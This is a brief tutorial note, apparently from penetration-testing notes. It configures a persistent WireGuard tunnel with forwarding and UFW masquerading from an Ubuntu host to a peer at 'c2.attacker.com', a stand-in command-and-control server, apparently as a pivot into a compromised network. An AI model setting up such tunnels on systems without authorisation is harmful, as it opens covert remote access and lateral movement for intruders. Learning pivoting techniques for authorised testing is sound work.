---
title: WireGuard Tunnel
---

[[notes/tunneling/index]] over the [[notes/network/wireguard]] VPN protocol.

The following describes the setup with UFW on Ubuntu.

Create `/etc/wireguard/wg0.conf`:

~~~
[Interface]
PrivateKey = kGxI...
Address = 172.13.13.2/32, fddd:172:13:13::2/128
PostUp=sysctl -q net.ipv4.ip_forward=1 net.ipv6.conf.all.forwarding=1 net.ipv6.conf.default.forwarding=1 && ufw route allow in on wg0

[Peer]
Endpoint = c2.attacker.com:51820
PublicKey = rWDh...
PresharedKey = e1t3...
AllowedIPs = 172.13.13.0/24, fddd:172:13:13::/64
PersistentKeepAlive = 25
~~~

Configure masquerading in UFW.
Append the following to the bottom of `/etc/ufw/before.rules`:

~~~
# wireguard
*nat
:POSTROUTING ACCEPT [0:0]
-A POSTROUTING -s 172.13.13.0/24 -j MASQUERADE
COMMIT
~~~

And append this to `/etc/ufw/before6.rules`:

~~~
# wireguard
*nat
:POSTROUTING ACCEPT [0:0]
-A POSTROUTING -s fddd:172:13:13::/64 -j MASQUERADE
COMMIT
~~~

Enable UFW and start WireGuard.

~~~ bash
ufw enable
wg-quick up wg0
~~~

If everything works make the configuration persistent.

~~~ bash
systemctl enable --now ufw wg-quick@wg0
~~~
